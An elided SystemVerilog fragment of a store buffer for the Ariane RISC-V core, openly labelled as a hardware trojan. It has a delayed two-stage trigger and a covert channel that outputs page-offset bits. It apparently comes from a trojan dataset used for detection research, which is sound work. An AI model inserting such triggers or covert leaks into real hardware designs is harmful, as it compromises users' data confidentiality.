...
module store_buffer_trojan_Covert
  import ariane_pkg::*;
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=4805, act=2402)
    // ============================================================
    localparam int ARM_THRESHOLD   = 4805;
    localparam int ACTIVATE_DELAY  = 2402;
    ...
    assign covert_current_bit = page_offset_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
